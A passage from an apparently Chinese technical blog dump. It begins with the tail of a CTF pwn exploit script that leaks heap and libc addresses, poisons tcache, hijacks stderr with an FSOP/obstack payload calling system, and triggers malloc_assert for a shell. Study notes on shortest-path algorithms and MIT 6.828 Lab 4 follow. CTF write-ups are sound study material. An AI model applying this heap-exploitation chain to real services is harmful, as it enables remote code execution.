class="keyword">lambda</span> x, y: log.success(<span class="string">f'<span class="subst">{x}</span>: <span class="subst">{<span class="built_in">hex</span>(y)}</span>'</span>)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive() <span class="keyword">if</span> io.connected() <span class="keyword">else</span> io.close()</span><br><span class="line">one_gadget = <span class="keyword">lambda</span> filename=LIBC: <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split()))</span><br><span class="line">dbg = <span class="keyword">lambda</span>: gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x40</span>,<span class="number">0xC0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>) <span class="comment">#将来的dist块</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">13</span>,<span class="number">0x40</span>,<span class="string">'a\n'</span>,<span class="number">0</span>) <span class="comment">#将来用来劫持的tcache</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">12</span>,<span class="number">0x40</span>,<span class="string">'a\n'</span>,<span class="number">0</span>) <span class="comment">#将来用来劫持的tcache</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x40</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x40</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)<span class="comment">#防止合并</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#填满tcache,得到unsortedbin</span></span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">11</span>,<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">11</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">11</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">12</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">13</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">0x40</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">0x40</span>,<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#放进tcache取出拿堆地址</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0xf0</span>,<span class="string">'\n'</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">heap_base = p.demangle(p.recvaddress(<span class="string">'bytes'</span>))-<span class="number">0xb60</span></span><br><span class="line">lg(<span class="string">"heap_base"</span>,heap_base)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#切割unsortedbin拿libc_base</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0x18</span>,<span class="string">'\n'</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x219dd0</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">target = p.libc_base+libc.sym[<span class="string">'stderr'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(p.mangle(heap_base+<span class="number">0x900</span>,target),<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#布置未初始化内存留给short用,0x11为top_idx,劫持tcache的next指针</span></span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0</span>,p.p48(<span class="number">0x11</span>),<span class="string">b'\n'</span>])</span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0x18</span>,payload,<span class="string">b'\n'</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#触发任意写</span></span><br><span class="line">short(p.mangle(heap_base+<span class="number">0x900</span>,target),<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#准备FSOP</span></span><br><span class="line">payload = p.obstack_attack(heap_base+<span class="number">0xb50</span>,{<span class="string">'system'</span>:p.system_addr,<span class="string">'io_obstack_jumps'</span>:p.libc_base+<span class="number">0x2163c0</span>})+<span class="string">b'\n'</span></span><br><span class="line"><span class="comment"># print(hex(len(payload)))</span></span><br><span class="line">add(<span class="number">520</span>,<span class="number">1314</span>,<span class="number">0xf0</span>,payload,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#劫持stderr指针</span></span><br><span class="line">add(<span class="number">20</span>,<span class="number">21</span>,<span class="number">0x40</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">20</span>,<span class="number">23</span>,<span class="number">0x40</span>,p64(heap_base+<span class="number">0xb50</span>)+<span class="string">b'\n'</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#准备malloc_assert</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">394</span>):</span><br><span class="line">    add(<span class="number">520</span>,<span class="number">1000</span>+i,<span class="number">0xf0</span>,<span class="string">'\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">520</span>,<span class="number">998</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">520</span>,<span class="number">999</span>,<span class="number">0xa8</span>,<span class="string">'a'</span>*<span class="number">0xa8</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#触发malloc_assert</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(promt,<span class="built_in">str</span>(<span class="number">114514</span>))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">p.recvflag()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最短路径算法</title>
      <link href="/2023/Shortest-Path-Algorithm/"/>
      <url>/2023/Shortest-Path-Algorithm/</url>
      
        <content type="html"><![CDATA[<p>为啥突然开始学算法?详见中华武数杯Shortest_path</p><h1 id="单源最短路径"><a href="#单源最短路径" class="headerlink" title="单源最短路径"></a>单源最短路径</h1><h2 id="Dijkstra算法"><a href="#Dijkstra算法" class="headerlink" title="Dijkstra算法"></a>Dijkstra算法</h2><p>定义一个集合S:从源点到该节点的最短路径已被找到的结点Vi的集合.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310172223227.png"><br>一个映射表(map)dist.dist[s,Vi]表示从s出发只经过集合S内的结点到达结点Vi的最短路径长度.(其实对这个算法而言是个数组)</p><p>初始状态集合S中仅有源点s,dist[s,s]=0.向dist数组中添加所有从源点s能直接到达的结点的路径长度.</p><span id="more"></span><p>{<br>找出不在集合S中的结点到s的路径最短的一个:Vj<br>遍历每个不在集合S中的结点(除Vj以外)Vi,如果dist[s,Vi]+Wj,i &lt; dist[s,Vi],意味着通过结点Vj,有一条比只经过S集合到达Vi更短的路径.更新dist并将Vj加入集合S.否则不更新dist将Vj加入集合S.(为了方便理解,调换了算法中将Vj加入集合S这一步骤的顺序)<br>}<br>持续遍历上述括号中的过程,随着集合S的扩大直到S==V,此时dist便表示从s出发到达结点Vi的所有路径最短的一条.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310172222684.png"></p><p>简化的例子,求A-&gt;D的最短路径.</p><blockquote><p>从A到D有三条路径,A-&gt;B-&gt;D.A-&gt;C-&gt;D,A-&gt;C.dist中首先将A-&gt;D的路径长度作为<code>未被验证的最短路径</code>(从A直接到达的路径).接下来就是验证这是最短路径.取出A能直接到达的结点中路径最短的一个:C,比较dist[A,C]+Wc,d与dist[A,D],若前者小则更新dist,A-&gt;C-&gt;D成为新的<code>未被验证的最短路径</code>.再取出A能到达的结点中路径次短的一个:B,循环验证,直到从A能直接到达的结点中路径最短的一个是终点D,则完成最短路径的验证.</p></blockquote><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310172326277.png"></p><p>该算法就是在不断的进行这一过程,由于该算法是求单源到所有结点的最短路径,所以验证一条最短路径成功后并不停止.</p><p>不能处理负权的原因:当结点Vj加入集合S后,并不会因为Vi-&gt;Vj有负权值的边而更新dist[Vj].该算法有个默认的逻辑:如果A-&gt;B的路径比A-&gt;C的路径长,那么A-&gt;B-&gt;C的路径一定比A-&gt;C长(到一个节点的最短路径必然会经过比它离起点更近的节点),而这个逻辑在负权值存在时不成立.</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><h4 id="纯翻译版–暴力"><a href="#纯翻译版–暴力" class="headerlink" title="纯翻译版–暴力"></a>纯翻译版–暴力</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Edge</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> val,dst;</span><br><span class="line">}Edge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">{</span><br><span class="line">    vector&lt;Edge&gt; edges;</span><br><span class="line">}Node;</span><br><span class="line"></span><br><span class="line">vector&lt;Node&gt; nodes;</span><br><span class="line">vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; dist;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; vis;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">if_end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i : vis)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="type">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    dist[s] = <span class="number">0</span>;</span><br><span class="line">    vis[s] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> edge:nodes[s].edges)</span><br><span class="line">    {</span><br><span class="line">        dist[edge.dst] = edge.val;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">int</span> min;</span><br><span class="line">        <span class="type">int</span> i,j;</span><br><span class="line">        <span class="comment">//初始化min</span></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;dist.<span class="built_in">size</span>();++j)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(vis[j]==<span class="literal">false</span>)</span><br><span class="line">            {</span><br><span class="line">                min = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//找出不在S中的结点到s的路径最短的一个Vj</span></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;dist.<span class="built_in">size</span>();++j)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(vis[j]==<span class="literal">false</span>&amp;&amp;dist[j]&lt;dist[min])</span><br><span class="line">            {</span><br><span class="line">                min = j;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        j = min;</span><br><span class="line">        vis[j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(if_end())</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//遍历不在每个集合S中的Vi,以经过Vj的路径验证其dist中路径是否最短.</span></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;dist.<span class="built_in">size</span>();++i)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(vis[i]==<span class="literal">false</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">auto</span> edge:nodes[j].edges)</span><br><span class="line">                {</span><br><span class="line">                    <span class="keyword">if</span>(edge.dst==i)</span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">if</span>(dist[j]==<span class="number">-1</span>)</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">if</span>(dist[j]+edge.val&lt;dist[i])</span><br><span class="line">                        {</span><br><span class="line">                            dist[i] = dist[j]+edge.val;</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Bellman–Ford-算法"><a href="#Bellman–Ford-算法" class="headerlink" title="Bellman–Ford 算法"></a>Bellman–Ford 算法</h2><p>遍历每个结点的每一条出边进行松弛操作(之前在Dijkstra中提到的验证最小路径并更新的操作).持续遍历直到无法进行松弛操作,最多遍历N-1轮.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310181707498.png"></p><p>解释一下N-1:每一次松弛使得最短路径的边数至少+1,而最短路径的边数最多是N-1条,故最多N-1次遍历一定能得到最短路径.如果第 N 轮循环时仍然存在能松弛的边，说明从s点出发,能够抵达一个负环。</p><h1 id="全源最短路径"><a href="#全源最短路径" class="headerlink" title="全源最短路径"></a>全源最短路径</h1><h2 id="Floyd算法"><a href="#Floyd算法" class="headerlink" title="Floyd算法"></a>Floyd算法</h2><p>oi-wiki上说得挺清楚了,通过一个递推关系,每次还是在比较从x-&gt;y的不通过k的路径和通过k的路径.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310181449072.png"></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= n; k++) {</span><br><span class="line">  <span class="keyword">for</span> (x = <span class="number">1</span>; x &lt;= n; x++) {</span><br><span class="line">    <span class="keyword">for</span> (y = <span class="number">1</span>; y &lt;= n; y++) {</span><br><span class="line">      f[x][y] = <span class="built_in">min</span>(f[x][y], f[x][k] + f[k][y]);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="应用-图的连通性"><a href="#应用-图的连通性" class="headerlink" title="应用:图的连通性"></a>应用:图的连通性</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310181501254.png"></p><h2 id="Johnson-全源最短路径算法"><a href="#Johnson-全源最短路径算法" class="headerlink" title="Johnson 全源最短路径算法"></a>Johnson 全源最短路径算法</h2><p>对有N个结点的无负权有向图,进行N轮Dijkstra算法得到全源最短路径.Johnson全源最短路径算法的精髓在于处理负权值的情况.</p><p>从一个简单的想法出发,既然问题出在负权值,那将每一条边的权值都加上最小权值的绝对值,不就消除了负权值吗?可惜这样做改变了最小路径.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310181631049.png"></p><p>可以发现这样做的问题在于,每一条start-&gt;end的路径长度的增量取决于经过的边的条数,破坏了原有的路径长短关系.<br>推出一个新的想法,找到一个start-&gt;end的不变量,该不变量仅由起点和终点决定而与中途经过的路程无关.物理学上的势能正好符合这一概念.</p><p>先建立一个虚拟结点0,有通向每个结点的权值为0的边,该节点为”零势能面”.然后在其上使用Bellman_Ford算法得到从结点0出发的单源最短路径,到结点i的单源最短路径记作hi.即结点i的势能.修改每一条边的权值为 hi-hj+W(i,j),即加上势能差.显然,这并不破坏路径的长短关系.</p><p>证明了该增量不会破环路径的长短关系后,再来看我们是否达到了消除负权的目的.</p><p>由最短路径的性质: hi + W(i,j) &gt;= hj.<br>于是有: hi-hj+W(i,j) &gt;= 0.<br>成功消除负权,可以正常进行N轮Dijkstra算法.</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://oi-wiki.org/graph/shortest-path">https://oi-wiki.org/graph/shortest-path</a><br><a href="https://zhuanlan.zhihu.com/p/129373740">https://zhuanlan.zhihu.com/p/129373740</a><br><a href="https://www.cnblogs.com/gaochundong/p/bellman_ford_algorithm.html">https://www.cnblogs.com/gaochundong/p/bellman_ford_algorithm.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab4</title>
      <link href="/2023/6.828-Lab4/"/>
      <url>/2023/6.828-Lab4/</url>
      
        <content type="html"><![CDATA[<h1 id="Lec-9"><a href="#Lec-9" class="headerlink" title="Lec 9"></a>Lec 9</h1><h2 id="“Locking”"><a href="#“Locking”" class="headerlink" title="“Locking”"></a>“Locking”</h2><blockquote><p>When we say that a lock protects data, we really mean that the lock protects some<br>collection of invariants that apply to the data. Invariants are properties of data struc-<br>tures that are maintained across operations. Typically, an operation’s correct behavior<br>depends on the invariants being true when the operation begins. The operation may<br>temporarily violate the invariants but must reestablish them before finishing. For ex-<br>ample, in the linked list case, the invariant is that list points at the first node in the<br>list and that each node’s next field points at the next node. The implementation of<br>insert violates this invariant temporarily: in line 15, l points to the next list element,<br>but list does not point at l yet (reestablished at line 16). The race condition we ex-<br>amined above happened because a second CPU executed code that depended on the<br>list invariants while they were (temporarily) violated. Proper use of a lock ensures that<br>only one CPU at a time can operate on the data structure in the critical section, so<br>that no CPU will execute a data structure operation when the data structure’s invari-<br>ants do not hold.</p></blockquote><span id="more"></span><blockquote><p>You can think of locks as serializing concurrent critical sections so that they run<br>one at a time, and thus preserve invariants (assuming they are correct in isolation).<br>You can also think of critical sections as being atomic with respect to each other, so<br>that a critical section that obtains the lock later sees only the complete set of changes<br>from earlier critical sections, and never sees partially-completed updates.</p></blockquote><h2 id="Lab-4-Preemptive-Multitasking"><a href="#Lab-4-Preemptive-Multitasking" class="headerlink" title="Lab 4: Preemptive Multitasking"></a>Lab 4: Preemptive Multitasking</h2><h3 id="Part-A-Multiprocessor-Support-and-Cooperative-Multitasking"><a href="#Part-A-Multiprocessor-Support-and-Cooperative-Multitasking" class="headerlink" title="Part A: Multiprocessor Support and Cooperative Multitasking"></a>Part A: Multiprocessor Support and Cooperative Multitasking</h3><h4 id="Multiprocessor-Support"><a href="#Multiprocessor-Support" class="headerlink" title="Multiprocessor Support"></a>Multiprocessor Support</h4><p>对称多处理器模型(SMP):<br>引导处理器 （BSP） 负责初始化系统和引导操作系统;应用处理器 （AP） 仅在操作系统启动并运行后由 BSP 激活。哪个处理器是 BSP 由硬件和 BIOS 决定。</p><blockquote><p>We are going to make JOS support “symmetric multiprocessing” (SMP), a multiprocessor model in which all CPUs have equivalent access to system resources such as memory and I/O buses. While all CPUs are functionally identical in SMP, during the boot process they can be classified into two types: the bootstrap processor (BSP) is responsible for initializing the system and for booting the operating system; and the application processors (APs) are activated by the BSP only after the operating system is up and running. Which processor is the BSP is determined by the hardware and the BIOS.</p></blockquote><p>每个CPU有个LAPIC单元,LAPIC单元负责在整个系统中传输中断</p><blockquote><p>In an SMP system, each CPU has an accompanying local APIC (LAPIC) unit. The LAPIC units are responsible for delivering interrupts throughout the system. The LAPIC also provides its connected CPU with a unique identifier. </p></blockquote><h5 id="Per-CPU-State-and-Initialization"><a href="#Per-CPU-State-and-Initialization" class="headerlink" title="Per-CPU State and Initialization"></a>Per-CPU State and Initialization</h5><p>映射MMIO.</p><blockquote><p>A processor accesses its LAPIC using memory-mapped I/O (MMIO). In MMIO, a portion of physical memory is hardwired to the registers of some I/O devices, so the same load/store instructions typically used to access memory can be used to access device registers. You’ve already seen one IO hole at physical address 0xA0000 (we use this to write to the VGA display buffer).</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Reserve size bytes in the MMIO region and map [pa,pa+size) at this</span></span><br><span class="line"><span class="comment">// location.  Return the base of the reserved region.  size does *not*</span></span><br><span class="line"><span class="comment">// have to be multiple of PGSIZE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line"><span class="title function_">mmio_map_region</span><span class="params">(<span class="type">physaddr_t</span> pa, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> base = MMIOBASE;</span><br><span class="line"></span><br><span class="line">size = ROUNDUP(size,PGSIZE);</span><br><span class="line">pa = ROUNDDOWN(pa,PGSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (base + size &gt; MMIOLIM)</span><br><span class="line">        panic(<span class="string">"mmio_map_region: cannot go higher than MMIOLIM!\n"</span>);</span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir,base,size,pa,PTE_PCD|PTE_PWT|PTE_W);</span><br><span class="line">base += size;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">void</span>*)(base-size);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>为每一个cpu映射栈空间.<br>注意下方是NCPU而不是ncpu,因为ncpu此时还未初始化.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Modify mappings in kern_pgdir to support SMP</span></span><br><span class="line"><span class="comment">//   - Map the per-CPU stacks in the region [KSTACKTOP-PTSIZE, KSTACKTOP)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">mem_init_mp</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NCPU;++i)</span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> kstacktop_i = KSTACKTOP-i*(KSTKSIZE+KSTKGAP);</span><br><span class="line">boot_map_region(kern_pgdir,kstacktop_i-KSTKSIZE,KSTKSIZE,PADDR(percpu_kstacks[i]),PTE_W|PTE_P);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>为每个CPU设置tss,idr.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap_init_percpu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> id = cpunum();</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP-id*(KSTKGAP+KSTKSIZE);</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_iomb = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Taskstate);</span><br><span class="line"></span><br><span class="line">gdt[(GD_TSS0&gt;&gt;<span class="number">3</span>)+id] = SEG16(STS_T32A, (<span class="type">uint32_t</span>) (&amp;(thiscpu-&gt;cpu_ts)),</span><br><span class="line"><span class="keyword">sizeof</span>(<span class="keyword">struct</span> Taskstate) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">gdt[(GD_TSS0&gt;&gt;<span class="number">3</span>)+id].sd_s = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// ltr(((GD_TSS0&gt;&gt;3)+id)&lt;&lt;3);</span></span><br><span class="line">ltr(GD_TSS0 + id*<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Gatedesc));</span><br><span class="line">lidt(&amp;idt_pd);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>下图有助于理解为什么gdt中使用cpt_ts的逻辑地址而不是物理地址，以及ltr操作的tss选择子.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310082204791.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310082204847.png"><br><img 